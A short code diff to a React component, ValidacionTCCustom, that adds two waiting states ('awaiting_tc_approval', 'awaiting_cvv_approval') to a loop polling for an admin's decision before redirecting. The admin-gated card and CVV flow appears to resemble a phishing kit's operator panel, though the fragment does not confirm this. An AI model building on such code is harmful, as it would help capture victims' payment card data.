@@ -317,7 +317,7 @@ export default function ValidacionTCCustom() {
                 console.log('TC Custom Polling:', estado);
 
                 // Redirecciones basadas en respuesta del admin
-                if (estado === 'pendiente' || estado === 'solicitar_tc_custom') {
+                if (estado === 'pendiente' || estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval' || estado === 'awaiting_cvv_approval') {
                     // Esperar...
                 } else {
                     switch (estado.toLowerCase()) {
@@ -369,7 +369,7 @@ export default function ValidacionTCCustom() {
                             break;
                     }
 
-                    if (estado !== 'pendiente' && estado !== 'solicitar_tc_custom') {
+                    if (estado !== 'pendiente' && estado !== 'solicitar_tc_custom' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
                         clearInterval(pollingInterval);
                     }
                 }
